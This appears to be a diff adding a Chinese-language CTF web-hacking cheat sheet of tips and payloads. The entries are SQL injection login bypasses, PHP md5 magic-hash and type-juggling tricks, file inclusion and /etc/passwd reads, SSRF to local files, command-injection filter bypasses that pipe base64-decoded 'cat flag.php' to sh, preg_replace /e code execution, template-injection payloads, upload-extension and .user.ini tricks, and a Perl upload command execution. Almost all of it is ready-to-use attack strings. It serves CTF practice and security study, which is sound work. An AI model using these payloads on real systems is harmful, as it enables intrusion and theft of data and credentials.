@@ -1,0 +1,85 @@
+md5碰撞：php md5 == 比较只要 开头0e+后面全数字 直接可以撞到byGcY、QNKCDZO、240610708，不行就数组绕
+md5php注入：md5(ffifdyop,true) = 'or 6****',类似"SELECT * FROM flag WHERE password = '" . md5($_GET["hash4"],true) . "'"; 的直接用ffifdyop
+页面审查：注意所有可访问的静态地址
+AAencode：配合火狐控制台可以识别变量类型，可用来修改报错
+mysql注入：1→1.1
+代码审计：php $$args：可变变量，使用?args=GLOBALS传入所有变量可应对include进目标文件的情况
+看到download，后面加个file=/etc/passwd看下有没有任意文件目录读取
+文件注入、文件读写、目录穿越、include文件包含：?file=php://filter/read=convert.base64-encode/resource=［文件路径] ，出不来多套几层../../
+文件包含：include、include_once、require、require_once
+文件包含也可执行任意命令，参考cisp培训笔记
+文件包含静态页面，利用前直接访问被包含页面试试，说不定能看到源码
+注入即使题目给的不是全文件名也试一下
+传参：总之先试下a[]=1、GLOBALS
+a[]也可绕过数字大小比较
+php查找模板或者看不懂的操作试着使用|ls -a触发linux语句
+int比较：科学计数法绕过(1.1e1)
+上传：考虑目录穿越(二进制改文件路径)、添加/.、%0a防止过滤后缀名
+上传.zip文件：考虑是否文件会被解压出来
+上传：.jpg.php2, php3, php4, php5, phps, pht, phtm, phtml, phar, jpg.php/.
+修改来自地址：Referer、X-Forwarded-For、client-ip，如果同时需要伪装域名和ip则分别改Referer和X-Forwarded-For
+修改页面参数的值：控制台运行key=11111111111111111111
+注入登录：-1' union select 1,md5(1)#、admin' or 1=1#，注册后进去重置密码，即可登录admin，万能密码登录参考cisp-pte=wp-zhaochun-1219-v2
+数字相等对比：转为16进制前加0x，不适用is_numeric（？）
+is_numeric绕过：多个回车
+SSRF，url链接访问获得文件内容：?url=file://localhost/var/www/html/flag.php
+伪造请求访问404页面：/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001
+异或：${"!"^"~"}="z"^"G";${"!"^"~"}();
+preg_match：正则匹配
+preg_replace($pat, $rep, $sub)：替换字符，pat和sub有相同部分，rep的代码就会执行，参照：pat=/(.*)/e&rep=system('ls')&sub=aa
+本地host绕过：127.0.0.1、0.0.0.0、localhost
+admin=%C3%A0%C4%8F%E1%B9%81%C3%8D%C3%B1=àďṁÍñ=ᴬᴰᴹᴵᴺ
+ping命令执行：|、;、%0a命令，由于读取出来的内容可能被网页渲染了记住F12看一下，常用cat、tail、head、more、tac，通配符匹配fla?.php
+ping绕过：127.0.0.1;a=c;b=a;c=t;$a$b$c ../key.php
+ping绕过2：echo 'cat' | base64得到Y2F0Cg==、`echo 'Y2F0Cg==' | base64 -d` test.txt
+ping绕过3：127.0.0.1&'c'at ../ke'y'.ph'p'
+ping绕过4：过滤空格和flag：echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh，其中Y2F0IGZsYWcucGhw是cat flag.php ,Y2F0IGZsYWc= cat flag
+试着使用data协议
+一堆请求务必看情况清空，以免影响个人判断
+当前目录没有务必返回上层目录看一下
+ereg纯数字绕过：1%00a
+数字绕过：
+php遇到assert也可用//截断，前面括号、引号记得闭合，参考：?page=').system("cat templates/flag.php");//
+文件注入没思路搞一下phpinfo
+php显示文件列表system("ls")
+urldecode：可能需要编码两次，转成unicode后把\u替换成%，可以使用%253f截断
+反序列化（unserialize）字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行，类名:个数改一下，
+参考：O:4:"xctf":1:{s:4:"flag";s:3:"111";}、O:4:"xctf":2:{s:4:"flag";s:3:"111";}
+php数据库信息存储在/var/www/html/data/common.inc.php文件内
+双写绕过：fflaglag
+../可以替换为..././
+文件上传图片格式：Content-Type:image/jpeg
+show_source：php显示文件内容
+X-Forwarded-For放在User-Agent下一行
+php点运算：字符串拼接
+调用php函数务必写全参数，不要随意使用默认值，宁愿复写一下
+对主页操作前先找到index.php的全url
+直接读取压缩包内文件：http://111.21.178.42:20002/?op=zip://./uploads/a.zip%23test.txt
+php+mysql禁止某账号登录，后面+%c2绕过（只能用burp），例如=admin%c2
+python的类的key被过滤时考虑使用字符串相加的方式构造key
+php == 比较：true等于任意数字、字符
+session数据用base64解码看下
+python模板注入：直接url加上/{{1+1}}，得到2即可注入，任何有返回值可控的地方都可试下，config和self也可考虑使用
+python模板注入，小括号过滤：{{url_for.__globals__['current_app'].config}}
+in_array：array内文件%253F目标文件，例如：array = [aaaa,bbbb], 注入aaaa%253F/../../../this_is_flag或aaaa?/../../../this_is_flag或aaaa#/../../../this_is_flag
+strstr绕过：大小写绕过，如php换成PHP
+Tornado框架考虑python模板注入，拿cookie：{{handler.settings}}
+OPTIONS协议检测开启了什么协议
+php进行解析的时候，如果变量前面有空格，会去掉前面的空格再解析，可以用来绕过字符串过滤：传参[num =1]变为[ num=1]
+scandir(chr(47))、scandir(\)：php查看当前目录
+var_dump：打印相关变量，例如var_dump(scandir(chr(47)))
+file_get_contents：读取文件，传入文件名要求内容相同使用data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=绕过，也可以不用base64：data://text/plain,welcome to the zjctf
+文件上传可以用尝试使用.user.ini把代码注入到index.php
+文件上传前面增加GIF89a绕过exif_imagetype黑名单检测
+md4与自己相等0e251288019
+原值相等md5不相等使用hash2[]=1&hash3[]=0e
+执行命令利用find / -name "*flag*"搜索flag
+Perl（.pl）站文件上传任意命令执行：
+内容添加：
+-----------------------------312623419042421556082293855654
+Content-Disposition: form-data; name="file";
+Content-Type: application/octet-stream
+
+ARGV
+参数放在url处，
+ls：?/bin/bash%20-c%20ls${IFS}/|
